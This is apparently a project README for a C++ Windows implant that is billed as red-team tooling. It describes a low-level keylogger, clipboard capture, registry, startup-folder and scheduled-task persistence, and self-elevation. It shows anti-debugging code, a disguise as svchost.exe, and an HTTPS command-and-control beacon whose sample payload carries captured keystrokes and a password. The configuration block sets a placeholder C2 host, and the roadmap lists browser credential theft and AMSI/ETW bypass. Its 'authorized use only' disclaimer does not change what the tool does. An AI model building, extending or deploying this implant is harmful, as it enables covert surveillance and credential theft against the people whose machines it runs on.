# Advanced Windows Penetration Testing Implant

![Pentest Implant](https://img.shields.io/badge/Status-Active-green?style=for-the-badge&logo=windows)
![Language](https://img.shields.io/badge/Language-C%2B%2B17-blue?style=for-the-badge&logo=cplusplus)
![Target](https://img.shields.io/badge/Target-Windows%20x64-red?style=for-the-badge&logo=windows)

**Advanced Windows Penetration Testing Framework** - Comprehensive red team implant for authorized security assessments. Features low-level keyboard interception, multi-vector persistence, system fingerprinting, network reconnaissance, and secure C2 communication over HTTPS.

## 🚀 Features

| Capability | Status | Description |
|------------|--------|-------------|
| **Low-Level Keyboard Hook** | ✅ Active | WH_KEYBOARD_LL global hook with thread-safe buffer |
| **Multi-Vector Persistence** | ✅ Active | Startup folder + HKCU/HKLM + Scheduled Tasks |
| **Self-Elevation** | ✅ Active | UAC bypass via `runas` elevation |
| **Anti-Analysis** | ✅ Active | Debugger detection + timing checks |
| **System Fingerprinting** | ✅ Active | Real OS version, admin status, architecture |
| **Network Recon** | ✅ Active | Local IPs + adapter enumeration |
| **Process Enumeration** | ✅ Active | Full process list via ToolHelp32 |
| **Clipboard Capture** | ✅ Active | Real-time clipboard monitoring |
| **Screenshot Capture** | ⚠️ Stub | GDI-based screen capture (extendable) |
| **HTTPS C2** | ✅ Active | WinHTTP with XOR encryption + stealth UA |
| **Stealth Mode** | ✅ Active | Console hiding + parent process unhook |

## 🛠️ Advanced Configuration

```cpp
// Edit these in the source before compilation
const std::wstring SERVER_HOST = L"your-pentest-server.com";
const std::wstring SERVER_PATH = L"/advanced-stream";
const int SERVER_PORT = 443;
const std::wstring STARTUP_NAME = L"svchost.exe";  // Ultra-stealth
const std::wstring ENCRYPTION_KEY = L"MySecretKey123";
```

## 📋 Prerequisites

- **Windows Vista+** (Win32_WINNT 0x0600)
- **Visual Studio 2019+** with Windows SDK
- **Administrator privileges** (self-elevates if needed)
- **HTTPS C2 server** ready to receive beacons

## 🔨 Build Instructions

```bash
# 1. Clone & Open in Visual Studio
git clone <your-repo>
# Open .sln or create new Win32 project

# 2. Link required libraries (already in #pragma comments)
# winhttp.lib, psapi.lib, iphlpapi.lib, etc.

# 3. Update SERVER_HOST & compile for x64 Release
# Output: implant.exe (stealth binary)
```

## 🎯 Usage

1. **Deploy** to target (authorized pentest only)
2. **Configure** C2 server endpoint
3. **Execute** - auto self-elevates & persists
4. **Monitor** HTTPS beacons every 3 seconds
5. **Exfil** contains: `SYS|NET|PROCS|KEYS|CLIP|SCREEN`

### Beacon Payload Format
```
SYS|arch:x64|os:10.0|host:WORKSTATION-ABC|user:john.doe|domain:CONTOSO|admin:true
|NET|ip:192.168.1.100;ip:10.0.0.5;|PROCS|svchost.exe(1234);explorer.exe(5678);
|KEYS|password123|CLIP|https://bank.com|SCREEN|screen_1920x1080_captured
```

## 🔒 Security Features

- **XOR Encryption** - Simple stream cipher for payload obfuscation
- **HTTPS/TLS** - Secure WinHTTP communication (port 443)
- **Stealth Naming** - `svchost.exe` + `WindowsSecurityService`
- **Living off the Land** - Native Windows APIs only
- **Error-Resistant** - Safe buffer handling & overflow protection

## 🧪 Anti-Analysis Protections

```cpp
void AntiAnalysis() {
    // Debugger detection
    if (IsDebuggerPresent()) ExitProcess(0);
    
    // Timing attack resistance (64-bit safe)
    ULONGLONG start = GetTickCount64();
    Sleep(100);
    if (GetTickCount64() - start < 90) ExitProcess(0);
}
```

## 📊 Persistence Mechanisms

| Method | Location | Privilege |
|--------|----------|-----------|
| **Startup Folder** | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | User |
| **HKCU Run** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | User |
| **HKLM Run** | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Admin |
| **Scheduled Task** | `WindowsUpdateCheck` (SYSTEM onlogon) | Admin |

## 🔗 Dependencies

All native Windows APIs - **zero external dependencies**:

```
winsock2.h, winhttp.h, tlhelp32.h, psapi.h, iphlpapi.h
shellapi.h, userenv.h, wtsapi32.h, wininet.h
```

## ⚠️  Authorized Use Only

```
✅ Authorized penetration testing
✅ Red team security assessments  
✅ Defensive security research
❌ Unauthorized system access
❌ Malicious use strictly prohibited
```

## 📈 Roadmap

- [ ] Full base64 screenshot encoding
- [ ] Browser credential extraction
- [ ] Mic/audio capture
- [ ] AMSI/ETW bypass
- [ ] Process hollowing injection
- [ ] Domain controller recon

## 🤝 Contributing

1. Fork the repo
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
4. Push & PR

## 📄 License

```
Educational / Authorized Pentesting License
© 2026 - For legitimate security testing only
```

---

**Built for cybersecurity professionals with explicit authorization. Handle with care.**

> **Note:** Update `SERVER_HOST` before deployment. Compile as **Release x64** for production use.
